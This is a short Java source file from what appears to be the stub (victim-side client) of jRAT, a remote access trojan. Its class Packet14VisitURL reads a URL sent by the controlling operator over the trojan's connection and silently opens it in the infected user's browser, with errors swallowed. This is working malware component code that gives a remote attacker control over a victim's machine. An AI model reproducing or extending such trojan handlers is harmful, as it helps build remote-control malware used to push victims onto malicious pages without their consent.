package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;

import java.net.URI;


public class Packet14VisitURL extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		try {
			java.awt.Desktop.getDesktop().browse(new URI(url));
		} catch (Exception ex) {

		}
	}

}
